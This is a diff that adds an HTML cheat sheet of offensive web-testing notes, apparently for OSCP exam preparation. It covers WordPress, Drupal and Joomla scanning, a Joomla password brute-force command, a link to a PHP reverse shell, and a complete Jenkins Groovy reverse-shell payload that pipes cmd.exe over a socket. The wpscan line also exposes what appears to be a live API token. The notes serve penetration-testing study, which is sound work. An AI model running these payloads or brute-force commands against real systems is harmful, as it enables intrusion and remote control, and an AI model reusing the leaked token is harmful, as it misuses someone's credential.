@@ -1,0 +1,32 @@
+<p><a href="https://github.com/saisathvik1/OSCP-Cheatsheet?tab=readme-ov-file">https://github.com/saisathvik1/OSCP-Cheatsheet?tab=readme-ov-file</a></p>
+<ul>
+<li>Scroll down for services scanning</li>
+</ul>
+<p>Wordpress</p>
+<ul>
+<li><code>wpscan --url {url} -e u,vp,vt --plugins-detection aggressive --api-token lT8xySbw7gMN4a2SoFlwpEXI8BzPdEyDn1GAcdaGKAE</code></li>
+</ul>
+<p>Drupal</p>
+<ul>
+<li><code>droopescan scan drupal -u {url}</code></li>
+</ul>
+<p>Joomla</p>
+<ul>
+<li><code>droopescan scan joomla -u {url}</code></li>
+<li><code>sudo python3 joomla-brute.py -u {url} -w passwords.txt -usr {username}</code> <ul>
+<li><a href="https://github.com/ajnik/joomla-bruteforce">https://github.com/ajnik/joomla-bruteforce</a></li>
+</ul>
+</li>
+</ul>
+<p>PHP</p>
+<ul>
+<li><a href="https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php">https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php</a> - reverse shell (cross platform)</li>
+</ul>
+<p>Jenkins</p>
+<ul>
+<li>Reverse shell:<pre><code><span class="hljs-keyword">String</span> host=<span class="hljs-string">"localhost"</span>;
+<span class="hljs-keyword">int</span> port=<span class="hljs-number">8044</span>;
+<span class="hljs-keyword">String</span> cmd=<span class="hljs-string">"cmd.exe"</span>;
+<span class="hljs-built_in">Process</span> p=<span class="hljs-keyword">new</span> ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=<span class="hljs-keyword">new</span> Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();<span class="hljs-built_in">while</span>(!s.isClosed()){<span class="hljs-built_in">while</span>(pi.<span class="hljs-built_in">available</span>()&gt;<span class="hljs-number">0</span>)so.<span class="hljs-built_in">write</span>(pi.<span class="hljs-built_in">read</span>());<span class="hljs-built_in">while</span>(pe.<span class="hljs-built_in">available</span>()&gt;<span class="hljs-number">0</span>)so.<span class="hljs-built_in">write</span>(pe.<span class="hljs-built_in">read</span>());<span class="hljs-built_in">while</span>(si.<span class="hljs-built_in">available</span>()&gt;<span class="hljs-number">0</span>)po.<span class="hljs-built_in">write</span>(si.<span class="hljs-built_in">read</span>());so.<span class="hljs-built_in">flush</span>();po.<span class="hljs-built_in">flush</span>();Thread.sleep(<span class="hljs-number">50</span>);<span class="hljs-built_in">try</span> {p.<span class="hljs-built_in">exitValue</span>();<span class="hljs-built_in">break</span>;}<span class="hljs-built_in">catch</span> (Exception e){}};p.destroy();s.<span class="hljs-built_in">close</span>();
+</code></pre></li>
+</ul>
